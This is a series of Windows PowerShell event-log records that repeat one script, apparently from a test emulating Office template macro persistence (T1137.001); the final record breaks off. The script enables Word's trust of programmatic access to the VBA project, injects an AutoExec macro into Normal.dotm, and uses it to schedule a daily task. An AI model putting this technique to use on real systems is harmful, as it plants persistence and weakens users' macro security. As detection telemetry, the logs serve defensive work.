{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-25 16:02:04.3109532"},"EventRecordID":"1067","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Registry, Started, \tProviderName=Registry\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=1\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=86abead8-2bbc-4596-bc7e-a89c1feaab1b\r\n\tHostApplication=powershell.exe &amp; {# Registry setting to \"Trust access to the VBA project object model\" in Word\r\n$registryKey = \"HKCU:Software\\Microsoft\\Office\\16.0\\Word\\Security\"\r\n$registryValue = \"AccessVBOM\"\r\n$registryData = \"1\"\r\n# The path where a flag text file will be created if Registry setting did not already exist or if it was set to 0\r\n$flagPath1 = \"$env:USERPROFILE\\AppData\\Roaming\\Microsoft\\Templates\\T1137-001_Flag1.txt\"\r\n$flagPath2 = \"$env:USERPROFILE\\AppData\\Roaming\\Microsoft\\Templates\\T1137-001_Flag2.txt\"\r\n# Get the value of the Key/Value pair\r\n$value = (Get-ItemProperty -Path $registryKey -Name $registryValue -ErrorAction SilentlyContinue).$registryValue\r\n# Logical operation to: if the value of the key/value is 1, do nothing - \r\n# if the value is 0, change it to 1 and create flag1 - \r\n# if it doesn't exist, create the value and flag2\r\nif ($value -eq \"1\") \r\n{\r\n Write-Host \"The registry value '$registryValue' already exists with the required setting.\"\r\n} \r\n elseif ($value -eq \"0\") \r\n{\r\n Write-Host \"The registry value was set to 0, temporarily changing to 1.\"\r\n New-ItemProperty -Path $registryKey -Name $registryValue -Value $registryData -PropertyType DWORD -Force | Out-Null\r\n echo \"flag1\" &gt; $flagPath1\r\n} \r\n else \r\n{\r\n Write-Host \"The registry value '$registryValue' does not exist, temporarily creating it.\"\r\n New-ItemProperty -Path $registryKey -Name $registryValue -Value $registryData -PropertyType DWORD -Force | Out-Null\r\n echo \"flag2\" &gt; $flagPath2\r\n}\r\nAdd-Type -AssemblyName Microsoft.Office.Interop.Word\r\n# Define the path of copied normal template for restoral\r\n$copyPath = \"$env:USERPROFILE\\AppData\\Roaming\\Microsoft\\Templates\\Normal1.dotm\"\r\n# Define the path to the normal template\r\n$docPath = \"$env:USERPROFILE\\AppData\\Roaming\\Microsoft\\Templates\\Normal.dotm\"\r\n# Create copy of orginal template for restoral\r\nCopy-Item -Path $docPath -Destination $copyPath -Force\r\n# VBA code to be insterted as a Macro\r\n# Will create a scheduled task to open the Calculator at 8:04pm daily\r\n$vbaCode = @\"\r\n  Sub AutoExec()\r\n  Dim applicationPath As String\r\n  Dim taskName As String\r\n  Dim runTime As String\r\n  Dim schTasksCmd As String\r\n  applicationPath = \"C:\\Windows\\System32\\calc.exe\"\r\n  taskName = \"OpenCalcTask\"\r\n  runTime = \"20:04\"\r\n  schTasksCmd = \"schtasks /create /tn \"\"\" &amp; taskName &amp; \"\"\" /tr \"\"\" &amp; applicationPath &amp; \"\"\" /sc daily /st \" &amp; runTime &amp; \" /f\"\r\n  Shell \"cmd.exe /c \" &amp; schTasksCmd, vbNormalFocus\r\n  End Sub\r\n\"@\r\n# Create a new instance of Word.Application\r\n$word = New-Object -ComObject Word.Application\r\n# Keep the Word application hidden\r\n$word.Visible = $false\r\n# Open the document\r\n$document = $word.Documents.Open($docPath)\r\n# Access the VBA project of the document\r\n$vbaProject = $document.VBProject\r\n# Add a new module to the VBA project\r\n$newModule = $vbaProject.VBComponents.Add(1) # 1 = vbext_ct_StdModule\r\n# Add the VBA code to the new module\r\n$newModule.CodeModule.AddFromString($vbaCode)\r\n# Run the Macro\r\n$word.run(\"AutoExec\")\r\n# Save and close the document\r\n$document.SaveAs($docPath)\r\n$document.Close()\r\n# Quit Word\r\n$word.Quit()\r\n# Release COM objects\r\n[System.Runtime.InteropServices.Marshal]::ReleaseComObject($document) | Out-Null\r\n[System.Runtime.InteropServices.Marshal]::ReleaseComObject($word) | Out-Null\r\n[System.Runtime.InteropServices.Marshal]::ReleaseComObject($vbaProject) | Out-Null\r\n[System.Runtime.InteropServices.Marshal]::ReleaseComObject($newModule) | Out-Null}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-25 16:02:04.3109532"},"EventRecordID":"1068","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Alias, Started, \tProviderName=Alias\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=3\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=86abead8-2bbc-4596-bc7e-a89c1feaab1b\r\n\tHostApplication=powershell.exe &amp; {# Registry setting to \"Trust access to the VBA project object model\" in Word\r\n$registryKey = \"HKCU:Software\\Microsoft\\Office\\16.0\\Word\\Security\"\r\n$registryValue = \"AccessVBOM\"\r\n$registryData = \"1\"\r\n# The path where a flag text file will be created if Registry setting did not already exist or if it was set to 0\r\n$flagPath1 = \"$env:USERPROFILE\\AppData\\Roaming\\Microsoft\\Templates\\T1137-001_Flag1.txt\"\r\n$flagPath2 = \"$env:USERPROFILE\\AppData\\Roaming\\Microsoft\\Templates\\T1137-001_Flag2.txt\"\r\n# Get the value of the Key/Value pair\r\n$value = (Get-ItemProperty -Path $registryKey -Name $registryValue -ErrorAction SilentlyContinue).$registryValue\r\n# Logical operation to: if the value of the key/value is 1, do nothing - \r\n# if the value is 0, change it to 1 and create flag1 - \r\n# if it doesn't exist, create the value and flag2\r\nif ($value -eq \"1\") \r\n{\r\n Write-Host \"The registry value '$registryValue' already exists with the required setting.\"\r\n} \r\n elseif ($value -eq \"0\") \r\n{\r\n Write-Host \"The registry value was set to 0, temporarily changing to 1.\"\r\n New-ItemProperty -Path $registryKey -Name $registryValue -Value $registryData -PropertyType DWORD -Force | Out-Null\r\n echo \"flag1\" &gt; $flagPath1\r\n} \r\n else \r\n{\r\n Write-Host \"The registry value '$registryValue' does not exist, temporarily creating it.\"\r\n New-ItemProperty -Path $registryKey -Name $registryValue -Value $registryData -PropertyType DWORD -Force | Out-Null\r\n echo \"flag2\" &gt; $flagPath2\r\n}\r\nAdd-Type -AssemblyName Microsoft.Office.Interop.Word\r\n# Define the path of copied normal template for restoral\r\n$copyPath = \"$env:USERPROFILE\\AppData\\Roaming\\Microsoft\\Templates\\Normal1.dotm\"\r\n# Define the path to the normal template\r\n$docPath = \"$env:USERPROFILE\\AppData\\Roaming\\Microsoft\\Templates\\Normal.dotm\"\r\n# Create copy of orginal template for restoral\r\nCopy-Item -Path $docPath -Destination $copyPath -Force\r\n# VBA code to be insterted as a Macro\r\n# Will create a scheduled task to open the Calculator at 8:04pm daily\r\n$vbaCode = @\"\r\n  Sub AutoExec()\r\n  Dim applicationPath As String\r\n  Dim taskName As String\r\n  Dim runTime As String\r\n  Dim schTasksCmd As String\r\n  applicationPath = \"C:\\Windows\\System32\\calc.exe\"\r\n  taskName = \"OpenCalcTask\"\r\n  runTime = \"20:04\"\r\n  schTasksCmd = \"schtasks /create /tn \"\"\" &amp; taskName &amp; \"\"\" /tr \"\"\" &amp; applicationPath &amp; \"\"\" /sc daily /st \" &amp; runTime &amp; \" /f\"\r\n  Shell \"cmd.exe /c \" &amp; schTasksCmd, vbNormalFocus\r\n  End Sub\r\n\"@\r\n# Create a new instance of Word.Application\r\n$word = New-Object -ComObject Word.Application\r\n# Keep the Word application hidden\r\n$word.Visible = $false\r\n# Open the document\r\n$document = $word.Documents.Open($docPath)\r\n# Access the VBA project of the document\r\n$vbaProject = $document.VBProject\r\n# Add a new module to the VBA project\r\n$newModule = $vbaProject.VBComponents.Add(1) # 1 = vbext_ct_StdModule\r\n# Add the VBA code to the new module\r\n$newModule.CodeModule.AddFromString($vbaCode)\r\n# Run the Macro\r\n$word.run(\"AutoExec\")\r\n# Save and close the document\r\n$document.SaveAs($docPath)\r\n$document.Close()\r\n# Quit Word\r\n$word.Quit()\r\n# Release COM objects\r\n[System.Runtime.InteropServices.Marshal]::ReleaseComObject($document) | Out-Null\r\n[System.Runtime.InteropServices.Marshal]::ReleaseComObject($word) | Out-Null\r\n[System.Runtime.InteropServices.Marshal]::ReleaseComObject($vbaProject) | Out-Null\r\n[System.Runtime.InteropServices.Marshal]::ReleaseComObject($newModule) | Out-Null}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-25 16:02:04.3109532"},"EventRecordID":"1069","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Environment, Started, \tProviderName=Environment\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=5\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=86abead8-2bbc-4596-bc7e-a89c1feaab1b\r\n\tHostApplication=powershell.exe &amp; {# Registry setting to \"Trust access to the VBA project object model\" in Word\r\n$registryKey = \"HKCU:Software\\Microsoft\\Office\\16.0\\Word\\Security\"\r\n$registryValue = \"AccessVBOM\"\r\n$registryData = \"1\"\r\n# The path where a flag text file will be created if Registry setting did not already exist or if it was set to 0\r\n$flagPath1 = \"$env:USERPROFILE\\AppData\\Roaming\\Microsoft\\Templates\\T1137-001_Flag1.txt\"\r\n$flagPath2 = \"$env:USERPROFILE\\AppData\\Roaming\\Microsoft\\Templates\\T1137-001_Flag2.txt\"\r\n# Get the value of the Key/Value pair\r\n$value = (Get-ItemProperty -Path $registryKey -Name $registryValue -ErrorAction SilentlyContinue).$registryValue\r\n# Logical operation to: if the value of the key/value is 1, do nothing - \r\n# if the value is 0, change it to 1 and create flag1 - \r\n# if it doesn't exist, create the value and flag2\r\nif ($value -eq \"1\") \r\n{\r\n Write-Host \"The registry value '$registryValue' already exists with the required setting.\"\r\n} \r\n elseif ($value -eq \"0\") \r\n{\r\n Write-Host \"The registry value was set to 0, temporarily changing to 1.\"\r\n New-ItemProperty -Path $registryKey -Name $registryValue -Value $registryData -PropertyType DWORD -Force | Out-Null\r\n echo \"flag1\" &gt; $flagPath1\r\n} \r\n else \r\n{\r\n Write-Host \"The registry value '$registryValue' does not exist, temporarily creating it.\"\r\n New-ItemProperty -Path $registryKey -Name $registryValue -Value $registryData -PropertyType DWORD -Force | Out-Null\r\n echo \"flag2\" &gt; $flagPath2\r\n}\r\nAdd-Type -AssemblyName Microsoft.Office.Interop.Word\r\n# Define the path of copied normal template for restoral\r\n$copyPath = \"$env:USERPROFILE\\AppData\\Roaming\\Microsoft\\Templates\\Normal1.dotm\"\r\n# Define the path to the normal template\r\n$docPath = \"$env:USERPROFILE\\AppData\\Roaming\\Microsoft\\Templates\\Normal.dotm\"\r\n# Create copy of orginal template for restoral\r\nCopy-Item -Path $docPath -Destination $copyPath -Force\r\n# VBA code to be insterted as a Macro\r\n# Will create a scheduled task to open the Calculator at 8:04pm daily\r\n$vbaCode = @\"\r\n  Sub AutoExec()\r\n  Dim applicationPath As String\r\n  Dim taskName As String\r\n  Dim runTime As String\r\n  Dim schTasksCmd As String\r\n  applicationPath = \"C:\\Windows\\System32\\calc.exe\"\r\n  taskName = \"OpenCalcTask\"\r\n  runTime = \"20:04\"\r\n  schTasksCmd = \"schtasks /create /tn \"\"\" &amp; taskName &amp; \"\"\" /tr \"\"\" &amp; applicationPath &amp; \"\"\" /sc daily /st \" &amp; runTime &amp; \" /f\"\r\n  Shell \"cmd.exe /c \" &amp; schTasksCmd, vbNormalFocus\r\n  End Sub\r\n\"@\r\n# Create a new instance of Word.Application\r\n$word = New-Object -ComObject Word.Application\r\n# Keep the Word application hidden\r\n$word.Visible = $false\r\n# Open the document\r\n$document = $word.Documents.Open($docPath)\r\n# Access the VBA project of the document\r\n$vbaProject = $document.VBProject\r\n# Add a new module to the VBA project\r\n$newModule = $vbaProject.VBComponents.Add(1) # 1 = vbext_ct_StdModule\r\n# Add the VBA code to the new module\r\n$newModule.CodeModule.AddFromString($vbaCode)\r\n# Run the Macro\r\n$word.run(\"AutoExec\")\r\n# Save and close the document\r\n$document.SaveAs($docPath)\r\n$document.Close()\r\n# Quit Word\r\n$word.Quit()\r\n# Release COM objects\r\n[System.Runtime.InteropServices.Marshal]::ReleaseComObject($document) | Out-Null\r\n[System.Runtime.InteropServices.Marshal]::ReleaseComObject($word) | Out-Null\r\n[System.Runtime.InteropServices.Marshal]::ReleaseComObject($vbaProject) | Out-Null\r\n[System.Runtime.InteropServices.Marshal]::ReleaseComObject($newModule) | Out-Null}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-25 16:02:04.3599799"},"EventRecordID":"1070","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"FileSystem, Started, \tProviderName=FileSystem\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=7\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=86abead8-2bbc-4596-bc7e-a89c1feaab1b\r\n\tHostApplication=powershell.exe &amp; {# Registry setting to \"Trust access to the VBA project object model\" in Word\r\n$registryKey = \"HKCU:Software\\Microsoft\\Office\\16.0\\Word\\Security\"\r\n$registryValue = \"AccessVBOM\"\r\n$registryData = \"1\"\r\n# The path where a flag text file will be created if Registry setting did not already exist or if it was set to 0\r\n$flagPath1 = \"$env:USERPROFILE\\AppData\\Roaming\\Microsoft\\Templates\\T1137-001_Flag1.txt\"\r\n$flagPath2 = \"$env:USERPROFILE\\AppData\\Roaming\\Microsoft\\Templates\\T1137-001_Flag2.txt\"\r\n# Get the value of the Key/Value pair\r\n$value = (Get-ItemProperty -Path $registryKey -Name $registryValue -ErrorAction SilentlyContinue).$registryValue\r\n# Logical operation to: if the value of the key/value is 1, do nothing - \r\n# if the value is 0, change it to 1 and create flag1 - \r\n# if it doesn't exist, create the value and flag2\r\nif ($value -eq \"1\") \r\n{\r\n Write-Host \"The registry value '$registryValue' already exists with the required setting.\"\r\n} \r\n elseif ($value -eq \"0\") \r\n{\r\n Write-Host \"The registry value was set to 0, temporarily changing to 1.\"\r\n New-ItemProperty -Path $registryKey -Name $registryValue -Value $registryData -PropertyType DWORD -Force | Out-Null\r\n echo \"flag1\" &gt; $flagPath1\r\n} \r\n else \r\n{\r\n Write-Host \"The registry value '$registryValue' does not exist, temporarily creating it.\"\r\n New-ItemProperty -Path $registryKey -Name $registryValue -Value $registryData -PropertyType DWORD -Force | Out-Null\r\n echo \"flag2\" &gt; $flagPath2\r\n}\r\nAdd-Type -AssemblyName Microsoft.Office.Interop.Word\r\n# Define the path of copied normal template for restoral\r\n$copyPath = \"$env:USERPROFILE\\AppData\\Roaming\\Microsoft\\Templates\\Normal1.dotm\"\r\n# Define the path to the normal template\r\n$docPath = \"$env:USERPROFILE\\AppData\\Roaming\\Microsoft\\Templates\\Normal.dotm\"\r\n# Create copy of orginal template for restoral\r\nCopy-Item -Path $docPath -Destination $copyPath -Force\r\n# VBA code to be insterted as a Macro\r\n# Will create a scheduled task to open the Calculator at 8:04pm daily\r\n$vbaCode = @\"\r\n  Sub AutoExec()\r\n  Dim applicationPath As String\r\n  Dim taskName As String\r\n  Dim runTime As String\r\n  Dim schTasksCmd As String\r\n  applicationPath = \"C:\\Windows\\System32\\calc.exe\"\r\n  taskName = \"OpenCalcTask\"\r\n  runTime = \"20:04\"\r\n  schTasksCmd = \"schtasks /create /tn \"\"\" &amp; taskName &amp; \"\"\" /tr \"\"\" &amp; applicationPath &amp; \"\"\" /sc daily /st \" &amp; runTime &amp; \" /f\"\r\n  Shell \"cmd.exe /c \" &amp; schTasksCmd, vbNormalFocus\r\n  End Sub\r\n\"@\r\n# Create a new instance of Word.Application\r\n$word = New-Object -ComObject Word.Application\r\n# Keep the Word application hidden\r\n$word.Visible = $false\r\n# Open the document\r\n$document = $word.Documents.Open($docPath)\r\n# Access the VBA project of the document\r\n$vbaProject = $document.VBProject\r\n# Add a new module to the VBA project\r\n$newModule = $vbaProject.VBComponents.Add(1) # 1 = vbext_ct_StdModule\r\n# Add the VBA code to the new module\r\n$newModule.CodeModule.AddFromString($vbaCode)\r\n# Run the Macro\r\n$word.run(\"AutoExec\")\r\n# Save and close the document\r\n$document.SaveAs($docPath)\r\n$document.Close()\r\n# Quit Word\r\n$word.Quit()\r\n# Release COM objects\r\n[System.Runtime.InteropServices.Marshal]::ReleaseComObject($document) | Out-Null\r\n[System.Runtime.InteropServices.Marshal]::ReleaseComObject($word) | Out-Null\r\n[System.Runtime.InteropServices.Marshal]::ReleaseComObject($vbaProject) | Out-Null\r\n[System.Runtime.InteropServices.Marshal]::ReleaseComObject($newModule) | Out-Null}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-25 16:02:04.3636071"},"EventRecordID":"1071","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Function, Started, \tProviderName=Function\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=9\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=86abead8-2bbc-4596-bc7e-a89c1feaab1b\r\n\tHostApplication=powershell.exe &amp; {# Registry setting to \"Trust access to the VBA project object model\" in Word\r\n$registryKey = \"HKCU:Software\\Microsoft\\Office\\16.0\\Word\\Security\"\r\n$registryValue = \"AccessVBOM\"\r\n$registryData = \"1\"\r\n# The path where a flag text file will be created if Registry setting did not already exist or if it was set to 0\r\n$flagPath1 = \"$env:USERPROFILE\\AppData\\Roaming\\Microsoft\\Templates\\T1137-001_Flag1.txt\"\r\n$flagPath2 = \"$env:USERPROFILE\\AppData\\Roaming\\Microsoft\\Templates\\T1137-001_Flag2.txt\"\r\n# Get the value of the Key/Value pair\r\n$value = (Get-ItemProperty -Path $registryKey -Name $registryValue -ErrorAction SilentlyContinue).$registryValue\r\n# Logical operation to: if the value of the key/value is 1, do nothing - \r\n# if the value is 0, change it to 1 and create flag1 - \r\n# if it doesn't exist, create the value and flag2\r\nif ($value -eq \"1\") \r\n{\r\n Write-Host \"The registry value '$registryValue' already exists with the required setting.\"\r\n} \r\n elseif ($value -eq \"0\") \r\n{\r\n Write-Host \"The registry value was set to 0, temporarily changing to 1.\"\r\n New-ItemProperty -Path $registryKey -Name $registryValue -Value $registryData -PropertyType DWORD -Force | Out-Null\r\n echo \"flag1\" &gt; $flagPath1\r\n} \r\n else \r\n{\r\n Write-Host \"The registry value '$registryValue' does not exist, temporarily creating it.\"\r\n New-ItemProperty -Path $registryKey -Name $registryValue -Value $registryData -PropertyType DWORD -Force | Out-Null\r\n echo \"flag2\" &gt; $flagPath2\r\n}\r\nAdd-Type -AssemblyName Microsoft.Office.Interop.Word\r\n# Define the path of copied normal template for restoral\r\n$copyPath = \"$env:USERPROFILE\\AppData\\Roaming\\Microsoft\\Templates\\Normal1.dotm\"\r\n# Define the path to the normal template\r\n$docPath = \"$env:USERPROFILE\\AppData\\Roaming\\Microsoft\\Templates\\Normal.dotm\"\r\n# Create copy of orginal template for restoral\r\nCopy-Item -Path $docPath -Destination $copyPath -Force\r\n# VBA code to be insterted as a Macro\r\n# Will create a scheduled task to open the Calculator at 8:04pm daily\r\n$vbaCode = @\"\r\n  Sub AutoExec()\r\n  Dim applicationPath As String\r\n  Dim taskName As String\r\n  Dim runTime As String\r\n  Dim schTasksCmd As String\r\n  applicationPath = \"C:\\Windows\\System32\\calc.exe\"\r\n  taskName = \"OpenCalcTask\"\r\n  runTime = \"20:04\"\r\n  schTasksCmd = \"schtasks /create /tn \"\"\" &amp; taskName &amp; \"\"\" /tr \"\"\" &amp; applicationPath &amp; \"\"\" /sc daily /st \" &amp; runTime &amp; \" /f\"\r\n  Shell \"cmd.exe /c \" &amp; schTasksCmd, vbNormalFocus\r\n  End Sub\r\n\"@\r\n# Create a new instance of Word.Application\r\n$word = New-Object -ComObject Word.Application\r\n# Keep the Word application hidden\r\n$word.Visible = $false\r\n# Open the document\r\n$document = $word.Documents.Open($docPath)\r\n# Access the VBA project of the document\r\n$vbaProject = $document.VBProject\r\n# Add a new module to the VBA project\r\n$newModule = $vbaProject.VBComponents.Add(1) # 1 = vbext_ct_StdModule\r\n# Add the VBA code to the new module\r\n$newModule.CodeModule.AddFromString($vbaCode)\r\n# Run the Macro\r\n$word.run(\"AutoExec\")\r\n# Save and close the document\r\n$document.SaveAs($docPath)\r\n$document.Close()\r\n# Quit Word\r\n$word.Quit()\r\n# Release COM objects\r\n[System.Runtime.InteropServices.Marshal]::ReleaseComObject($document) | Out-Null\r\n[System.Runtime.InteropServices.Marshal]::ReleaseComObject($word) | Out-Null\r\n[System.Runtime.InteropServices.Marshal]::ReleaseComObject($vbaProject) | Out-Null\r\n[System.Runtime.InteropServices.Marshal]::ReleaseComObject($newModule) | Out-Null}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-25 16:02:04.3664334"},"EventRecordID":"1072","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Variable, Started, \tProviderName=Variable\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=11\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=86abead8-2bbc-4596-bc7e-a89c1feaab1b\r\n\tHostApplication=powershell.exe &amp; {# Registry setting to \"Trust access to the VBA project object model\" in Word\r\n$registryKey = \"HKCU:Software\\Microsoft\\Office\\16.0\\Word\\Security\"\r\n$registryValue = \"AccessVBOM\"\r\n$registryData = \"1\"\r\n# The path where a flag text file will be created if Registry setting did not already exist or if it was set to 0\r\n$flagPath1 = \"$env:USERPROFILE\\AppData\\Roaming\\Microsoft\\Templates\\T1137-001_Flag1.txt\"\r\n$flagPath2 = \"$env:USERPROFILE\\AppData\\Roaming\\Microsoft\\Templates\\T1137-001_Flag2.txt\"\r\n# Get the value of the Key/Value pair\r\n$value = (Get-ItemProperty -Path $registryKey -Name $registryValue -ErrorAction SilentlyContinue).$registryValue\r\n# Logical operation to: if the value of the key/value is 1, do nothing - \r\n# if the value is 0, change it to 1 and create flag1 - \r\n# if it doesn't exist, create the value and flag2\r\nif ($value -eq \"1\") \r\n{\r\n Write-Host \"The registry value '$registryValue' already exists with the required setting.\"\r\n} \r\n elseif ($value -eq \"0\") \r\n{\r\n Write-Host \"The registry value was set to 0, temporarily changing to 1.\"\r\n New-ItemProperty -Path $registryKey -Name $registryValue -Value $registryData -PropertyType DWORD -Force | Out-Null\r\n echo \"flag1\" &gt; $flagPath1\r\n} \r\n else \r\n{\r\n Write-Host \"The registry value '$registryValue' does not exist, temporarily creating it.\"\r\n New-ItemProperty -Path $registryKey -Name $registryValue -Value $registryData -PropertyType DWORD -Force | Out-Null\r\n echo \"flag2\" &gt; $flagPath2\r\n}\r\nAdd-Type -AssemblyName Microsoft.Office.Interop.Word\r\n# Define the path of copied normal template for restoral\r\n$copyPath = \"$env:USERPROFILE\\AppData\\Roaming\\Microsoft\\Templates\\Normal1.dotm\"\r\n# Define the path to the normal template\r\n$docPath = \"$env:USERPROFILE\\AppData\\Roaming\\Microsoft\\Templates\\Normal.dotm\"\r\n# Create copy of orginal template for restoral\r\nCopy-Item -Path $docPath -Destination $copyPath -Force\r\n# VBA code to be insterted as a Macro\r\n# Will create a scheduled task to open the Calculator at 8:04pm daily\r\n$vbaCode = @\"\r\n  Sub AutoExec()\r\n  Dim applicationPath As String\r\n  Dim taskName As String\r\n  Dim runTime As String\r\n  Dim schTasksCmd As String\r\n  applicationPath = \"C:\\Windows\\System32\\calc.exe\"\r\n  taskName = \"OpenCalcTask\"\r\n  runTime = \"20:04\"\r\n  schTasksCmd = \"schtasks /create /tn \"\"\" &amp; taskName &amp; \"\"\" /tr \"\"\" &amp; applicationPath &amp; \"\"\" /sc daily /st \" &amp; runTime &amp; \" /f\"\r\n  Shell \"cmd.exe /c \" &amp; schTasksCmd, vbNormalFocus\r\n  End Sub\r\n\"@\r\n# Create a new instance of Word.Application\r\n$word = New-Object -ComObject Word.Application\r\n# Keep the Word application hidden\r\n$word.Visible = $false\r\n# Open the document\r\n$document = $word.Documents.Open($docPath)\r\n# Access the VBA project of the document\r\n$vbaProject = $document.VBProject\r\n# Add a new module to the VBA project\r\n$newModule = $vbaProject.VBComponents.Add(1) # 1 = vbext_ct_StdModule\r\n# Add the VBA code to the new module\r\n$newModule.CodeModule.AddFromString($vbaCode)\r\n# Run the Macro\r\n$word.run(\"AutoExec\")\r\n# Save and close the document\r\n$document.SaveAs($docPath)\r\n$document.Close()\r\n# Quit Word\r\n$word.Quit()\r\n# Release COM objects\r\n[System.Runtime.InteropServices.Marshal]::ReleaseComObject($document) | Out-Null\r\n[System.Runtime.InteropServices.Marshal]::ReleaseComObject($word) | Out-Null\r\n[System.Runtime.InteropServices.Marshal]::ReleaseComObject($vbaProject) | Out-Null\r\n[System.Runtime.InteropServices.Marshal]::ReleaseComObject($newModule) | Out-Null}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"400"},"Version":"0","Level":"4","Task":"4","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-25 16:02:04.7609671"},"EventRecordID":"1073","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Available, None, \tNewEngineState=Available\r\n\tPreviousEngineState=None\r\n\r\n\tSequenceNumber=13\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=86abead8-2bbc-4596-bc7e-a89c1feaab1b\r\n\tHostApplication=powershell.exe &amp; {# Registry setting to \"Trust access to the VBA project object model\" in Word\r\n$registryKey = \"HKCU:Software\\Microsoft\\Office\\16.0\\Word\\Security\"\r\n$registryValue = \"AccessVBOM\"\r\n$registryData = \"1\"\r\n# The path where a flag text file will be created if Registry setting did not already exist or if it was set to 0\r\n$flagPath1 = \"$env:USERPROFILE\\AppData\\Roaming\\Microsoft\\Templates\\T1137-001_Flag1.txt\"\r\n$flagPath2 = \"$env:USERPROFILE\\AppData\\Roaming\\Microsoft\\Templates\\T1137-001_Flag2.txt\"\r\n# Get the value of the Key/Value pair\r\n$value = (Get-ItemProperty -Path $registryKey -Name $registryValue -ErrorAction SilentlyContinue).$registryValue\r\n# Logical operation to: if the value of the key/value is 1, do nothing - \r\n# if the value is 0, change it to 1 and create flag1 - \r\n# if it doesn't exist, create the value and flag2\r\nif ($value -eq \"1\") \r\n{\r\n Write-Host \"The registry value '$registryValue' already exists with the required setting.\"\r\n} \r\n elseif ($value -eq \"0\") \r\n{\r\n Write-Host \"The registry value was set to 0, temporarily changing to 1.\"\r\n New-ItemProperty -Path $registryKey -Name $registryValue -Value $registryData -PropertyType DWORD -Force | Out-Null\r\n echo \"flag1\" &gt; $flagPath1\r\n} \r\n else \r\n{\r\n Write-Host \"The registry value '$registryValue' does not exist, temporarily creating it.\"\r\n New-ItemProperty -Path $registryKey -Name $registryValue -Value $registryData -PropertyType DWORD -Force | Out-Null\r\n echo \"flag2\" &gt; $flagPath2\r\n}\r\nAdd-Type -AssemblyName Microsoft.Office.Interop.Word\r\n# Define the path of copied normal template for restoral\r\n$copyPath = 